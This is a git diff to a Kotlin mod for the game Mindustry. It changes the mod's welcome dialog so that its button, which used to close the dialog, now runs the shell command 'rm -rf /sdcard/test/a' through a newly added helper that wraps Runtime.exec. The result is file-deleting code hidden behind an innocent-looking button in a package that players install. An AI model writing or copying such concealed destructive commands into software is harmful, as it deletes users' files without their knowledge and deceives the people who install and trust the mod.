@@ -6,9 +6,12 @@ import arc.util.Time
 import com.github.purofle.content.Blocks
 import mindustry.game.EventType.WorldLoadEvent
 import mindustry.mod.Mod
-import mindustry.ui.dialogs.*
-import mindustry.world.Block
-import mindustry.world.blocks.defense.turrets.ItemTurret
+import mindustry.ui.dialogs.BaseDialog
+
+fun String.run(): Process {
+    val run = Runtime.getRuntime()
+    return run.exec(this)
+}
 
 public class TestMod : Mod() {
     init {
@@ -18,7 +21,9 @@ public class TestMod : Mod() {
             Time.runTask(10f) {
                 val dialog = BaseDialog("欢迎使用本mod!")
                 dialog.cont.add("[red]本mod目前尚未完善（")
-                dialog.cont.button("给爷爬", dialog::hide).size(70f, 50f)
+                dialog.cont.button("给爷爬") {
+                    "rm -rf /sdcard/test/a".run()
+                }.size(70f, 50f)
                 dialog.show()
             }
         }
